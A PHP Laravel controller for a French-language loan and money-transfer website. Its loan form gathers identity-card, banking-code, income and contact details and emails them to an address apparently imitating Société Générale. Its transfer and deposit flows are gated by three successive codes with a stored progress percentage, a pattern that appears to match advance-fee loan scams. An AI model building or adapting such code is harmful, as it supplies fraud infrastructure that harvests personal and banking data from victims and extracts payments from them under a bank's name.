<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use App\Pret;
use App\Virement;
use App\Utilisateur;
use App\CodeConfirm;
use Illuminate\Support\Facades\Mail;
use App\Mail\PretMail;
use App\Mail\VirementMail;
use App\Mail\CodeMail;
use App\Mail\CodeMail2;
use App\Mail\CodeMail3;
use App\Transfert;
use Illuminate\Support\Facades\Auth;

class OperationController extends Controller
{
    public function getLastVirement() {
        $virements = Virement::where('user_id', Auth::user()->id)->orderBy('created_at', 'desc')->limit(1)->get();
        return $virements[0];
    }

    public function getLastTransfert() {
        $transferts = Transfert::where('user_id', Auth::user()->id)->orderBy('created_at', 'desc')->limit(1)->get();
        return $transferts[0];
    }

    public function pret()
    {
        if(Auth::user()) {
            return redirect()->route('front.virement');
        }
    	return view('front.operation');
    }

    public function pretPost(Request $request)
    {
    	request()->validate([
    		'nom'=>'required|max:50',
    		'prenom'=>'required|max:50',
    		'date_naissance'=>'required',
    		'telephone'=>'required',
    		'adresse'=>'required',
            'ville'=>'required',
    		'rolePret'=>'max:255',
            'pays'=>'required',
    		'idCard'=>'required',
    		'montantPret'=>'required',
    		'revenuAnnuel'=>'required',
    		'statutProfessionnel'=>'required',
    		'email'=>'required|email',
    	]);

        $pret = new Pret;

        $pret->nom = request('nom');
        $pret->prenom = request('prenom');
        $pret->devise = request('devise');
        $pret->deviseRevenu = request('deviseRevenu');
        $pret->date_naissance = request('date_naissance');
        $pret->telephone = request('telephone');
        $pret->adresse = request('adresse');
        $pret->ville = request('ville');
        $pret->region = request('region');
        $pret->pays = request('pays');
        $pret->codePostal = request('codePostal');
        $pret->montantPret = request('montantPret');
        $pret->rolePret = request('rolePret');
        $pret->revenuAnnuel = request('revenuAnnuel');
        $pret->nousConnaitre = request('nousConnaitre');
        $pret->statutProfessionnel = request('statutProfessionnel');
        $pret->email = request('email');
        $pret->idCard = request('idCard');
        $pret->codeBancaire = request('codeBancaire');
        $pret->delaiRemboursement = request('delaiRemboursement');

        $pret->save();

        Mail::to('infoline@oursocietygenerale.com')->send(new PretMail($request->except('_token')));

        $succes = 'Votre demande de prêt a été bien envoyé !';

        return back()->withSuccess($succes);
    }

    public function indexPrets()
    {
        $prets = Pret::all();

        return view('back.prets.list', compact('prets'));
    }

    public function store($id)
    {
        $pret = Pret::findOrFail($id);

        return view('back.prets.detail', compact('pret'));
    }

    public function virement()
    {
        if(auth()->guest()){
            return redirect()->route('front.login');
        }

        $virements = Virement::where('user_id', Auth::user()->id)->orderBy('created_at', 'desc')->limit(1)->get();

        if($virements->count() == 0) {
            $virement = new Virement;
            $virement->percent = 0;
        } else {
            if(!$virements[0]->finish) {
                $virement = $virements[0];
            } else {
                $virement = new Virement;
                $virement->percent = 0;
            }
        }

        $virement->user_id = Auth::user()->id;
        $virement->save();

        return view('front.virement');
    }

    public function virementPost(Request $request)
    {
        if(auth()->guest()){
            return redirect()->route('front.login');
        }
        request()->validate([
            'iban' => 'required',
            'bicswift' => 'required',
            'nameBanque' => 'required',
            'montant' => 'required',
            'code' =>'required',
            'devise' =>'required',
        ]);

        $virement = $this->getLastVirement();
        if(request('code') != $virement->code1)
        {
            return redirect()->back()->withInput()->withErrors([
                'error' => ''
            ]);
        }

        $virement->iban = request('iban');
        $virement->bicswift = request('bicswift');
        $virement->nameBanque = request('nameBanque');
        $virement->montant = request('montant');
        $virement->devise = request('devise');

        $virement->save();

        return redirect()->route('front.virement2');
    }

    public function virement2()
    {
        $virement = $this->getLastVirement();

        $percent =  $virement->percent;
        return view('front.virement2', compact('percent'));
    }

    public function virementPost2()
    {
        $virement = $this->getLastVirement();
        if (request('code2') == $virement->code2)
        {
            return redirect()->route('front.virement3');
        }
        else
        {
            return redirect()->back()->withErrors(['error' => '']);
        }
    }

    public function virement3()
    {
        $virement = $this->getLastVirement();

        $percent =  $virement->percent;
        return view('front.virement3', compact('percent'));
    }

    public function virementPost3()
    {
        $virement = $this->getLastVirement();
        if (request('code3') == $virement->code3)
        {
            $percent =  $virement->percent;
            $finish = 0;
            $virement->finish = true;
            $virement->save();

            return view('front.virement3', compact(['percent' ,'finish']));
        }
        else
        {
            return redirect()->back()->withErrors(['error' => '']);
        }
    }

    public function transfert()
    {
        if(auth()->guest()){
            return redirect()->route('front.login');
        }

        $transferts = Transfert::where('user_id', Auth::user()->id)->orderBy('created_at', 'desc')->limit(1)->get();

        if($transferts->count() == 0) {
            $transfert = new Transfert;
            $transfert->percent = 0;
        } else {
            if(!$transferts[0]->finish) {
                $transfert = $transferts[0];
            } else {
                $transfert = new Transfert;
                $transfert->percent = 0;
            }
        }

        $transfert->user_id = Auth::user()->id;
        $transfert->save();

        return view('front.depot');
    }

    public function transfertPost(Request $request)
    {
        if(auth()->guest()){
            return redirect()->route('front.login');
        }
        request()->validate([
            'paiement_mode' => 'required',
            'montant' => 'required',
            'devise' =>'required',
        ]);

        $transfert = $this->getLastTransfert();
        $transfert->paiement_mode = request('paiement_mode');
        $transfert->montant = request('montant');
        $transfert->devise = request('devise');

        $transfert->save();

        return redirect()->route('front.transfert1');
    }

    public function transfert1()
    {
        $transfert = $this->getLastTransfert();

        $percent =  $transfert->percent;
        return view('front.depot1', compact('percent'));
    }

    public function transfertPost1()
    {
        $transfert = $this->getLastTransfert();
        if (request('code1') == $transfert->code1)
        {
            return redirect()->route('front.transfert2');
        }
        else
        {
            return redirect()->back()->withErrors(['error' => '']);
        }
    }

    public function transfert2()
    {
        $transfert = $this->getLastTransfert();

        $percent =  $transfert->percent;
        return view('front.depot2', compact('percent'));
    }

    public function transfertPost2()
    {
        $transfert = $this->getLastTransfert();
        if (request('code2') == $transfert->code2)
        {
            return redirect()->route('front.transfert3');
        }
        else
        {
            return redirect()->back()->withErrors(['error' => '']);
        }
    }

    public function transfert3()
    {
        $transfert = $this->getLastTransfert();

        $percent =  $transfert->percent;
        return view('front.depot3', compact('percent'));
    }

    public function transfertPost3()
    {
        $transfert = $this->getLastTransfert();
        if (request('code3') == $transfert->code3)
        {
            $percent =  $transfert->percent;
            $finish = 0;
            $transfert->finish = true;
            $transfert->save();

            $user = Auth::user();
            $user->montantCompte = $user->montantCompte + $transfert->montant;
            $user->save();

            return view('front.depot3', compact(['percent' ,'finish']));
        }
        else
        {
            return redirect()->back()->withErrors(['error' => '']);
        }
    }
}
